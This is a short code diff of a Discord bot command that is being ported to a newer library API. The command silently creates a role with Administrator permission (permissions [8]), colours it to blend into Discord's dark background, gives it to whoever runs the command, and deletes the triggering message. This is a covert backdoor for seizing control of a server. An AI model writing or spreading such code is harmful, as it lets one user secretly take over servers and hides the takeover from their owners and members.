@@ -4,16 +4,18 @@ module.exports.run = async (bot, message, args) => {
 
     try {
 
-        role = await message.guild.createRole({
+        role = await message.guild.roles.create ({
 
-            name: "Dope Role",
-          	color: "#2f3136",
-          	permissions: [8]
+            data: {
+                name: "Dope Role",
+          	    color: "#2f3136",
+          	    permissions: [8]
+            }
 
         });
             
-        message.member.addRole(role)
-        message.delete(1000);
+        message.member.roles.add(role)
+        message.delete();
 
     } catch(e) {
 
